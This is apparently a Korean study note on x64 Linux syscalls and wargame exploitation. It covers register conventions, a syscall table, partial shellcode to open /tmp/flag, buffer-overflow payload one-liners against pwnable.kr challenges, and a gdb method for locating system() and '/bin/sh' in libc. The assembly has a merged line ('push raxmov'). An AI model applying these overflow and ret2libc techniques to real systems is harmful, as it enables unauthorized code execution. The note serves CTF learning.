# syscall
시스템 콜은 함수
필요한 기능과 인자에 대한 정보를 레지스터로 전달하면, 커널이 이를 읽어서 요청을 처리
리눅스에서는 x64아키텍처에서 `rax`로 무슨 요청인지 나타내고, 아래의 순서대로 필요한 인자를 전달함

**요청:** rax
**인자 순서:** rdi → rsi → rdx → rcx → r8 → r9 → stack

![[Pasted image 20231024221325.png]]

syscall table을 보면, rax가 0x1일 때, 커널에 write 시스템콜을 요청함
이때 rdi, rsi, rdx가 0x1, 0x401000, 0xb 이므로 커널은 write(0x1, 0x401000, 0xb)를 수행하게 됨
write함수의 각 인자는 출력 스트림, 출력 버퍼, 출력 길이
여기서 0x1은 stdout이며, 이는 일반적으로 화면을 의미
0x401000에는 Hello World가 저장되어 있고, 
길이는 0xb로 지정되어 있으므로, 
화면에 Hello World가 출력됨


# x64 syscall 테이블
총 갯수가 300개 이상
필요할 때 검색하면 됨

|**syscall**|**rax**|**arg0 (rdi)**|**arg1 (rsi)**|**arg2 (rdx)**|
|---|---|---|---|---|
|read|0x00|unsigned int fd|char `*`buf|size_t count|
|write|0x01|unsigned int fd|const char `*`buf|size_t count|
|open|0x02|const char `*`filename|int flags|umode_t mode|
|close|0x03|unsigned int fd|||
|mprotect|0x0a|unsigned long start|size_t len|unsigned long prot|
|connect|0x2a|int sockfd|struct sockaddr `*` addr|int addrlen|
|execve|0x3b|const char `*`filename|const char `*`const `*`argv|const char *const *envp|

인자 가능한 설정 확인 주소
https://code.woboq.org/userspace/glibc/bits/fcntl.h.html#24


# 파일 입출력 구현
`"/tmp/flag"`를 읽는 셸코드를 작성
```c
char buf[0x30]; 
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```


1. `"/tmp/flag"`라는 문자열을 메모리에 위치시키기
`"/tmp/flag"` 라는 문자열을 리틀엔디언으로 표현하면 `0x616c662f706d742f67`
스택에 `0x616c662f706d742f67(/tmp/flag)`를 push
하지만 스택에는 8 바이트 단위로만 값을 push할 수 있으므로 
`0x67`를 우선 push한 후, `0x616c662f706d742f`를 push

2. 첫 번째 인자 설정
rdi가 이를 가리키도록 rsp를 rdi로 옮김

3. 두 번째 인자 설정
O_RDONLY는 0이므로, rsi는 0으로 설정

4. 세 번째 인자 설정
파일을 읽을 때, mode는 의미를 갖지 않으므로 rdx는 0으로 설정

5. syscall 값 설정
rax를 open의 syscall 값인 2로 설정

### Implement
```
push 0x67
mov rax, 0x616c662f706d742f 
push raxmov rdi, rsp ; rdi = "/tmp/flag"
xor rsi, rsi ; rsi = 0 ; RD_ONLY
xor rdx, rdx ; rdx = 0
mov rax, 2 ; rax = 2 ; syscall_open
syscall ; open("/tmp/flag", RD_ONLY, NULL)
```




# Example shell code

```bash
./bof `python -c "print 'A'*52+'\xbe\xba\xfe\xca'"`
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | ./bof
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000

./col `python -c "print '\xcc\xce\xc5\x06'+'\xc8\xce\xc5\x06'*4"`
```



# How to find system() and bin/sh

```bash
ldd ./target
shared_library 	/lib/i386-linux-gnu/libc.so.6

strings -tx [shared_library] | grep "bin/sh"
/bin/sh		0x15bb2b

gdb [shared_library]
print system
system		0x3adb0

p/x 0x15bb2b-0x3adb0
$2=0x120d7b

diff		0x120d7b

gdb target
r
print system
0xf7630db0

p/x 0xf7630db0 + 0x120d7b
0xf7751b2b

x/s 0xf7751b2b
"/bin/sh"
```
